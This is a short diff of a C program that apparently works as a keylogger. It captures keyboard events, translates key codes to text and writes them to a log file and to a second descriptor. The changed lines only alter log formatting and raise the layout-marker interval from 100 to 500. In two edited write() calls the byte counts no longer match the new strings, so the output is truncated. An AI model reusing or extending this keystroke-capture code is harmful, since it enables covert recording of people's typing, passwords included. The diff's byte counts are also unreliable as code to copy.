@@ -187,8 +187,8 @@ int main(int argc, char** argv)
 				if(!ly)
 				{
 					layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
-					fprintf(dst, "\n[LAYOUT: %s ]\n", layout);
-					ly = 100;
+					fprintf(dst, "\n\n[LAYOUT: %s ]\n\n", layout);
+					ly = 500;
 				}
 
 				ly--;
@@ -206,6 +206,7 @@ int main(int argc, char** argv)
 					fprintf(dst, "\n\n[%s]\n\n", used);
 					n = 0;
 				}
+
 				fprintf(dst,"%s",code_to_str(layout, event.code));
 				fflush(NULL);
 			}
@@ -232,10 +233,10 @@ int main(int argc, char** argv)
 				if(!ly)
 				{
 					layout = get_kb_layout(get_kb_keycodes(), get_kb_symbols());
-					write(lc,"\n[LAYOUT: ", 10);
+					write(lc,"\n\n[LAYOUT: ", 10);
 					write(lc, layout, strlen(layout));
-					write(lc, " ]\n", 4);
-					ly = 100;
+					write(lc, " ]\n\n", 4);
+					ly = 500;
 				}
 
 				ly--;
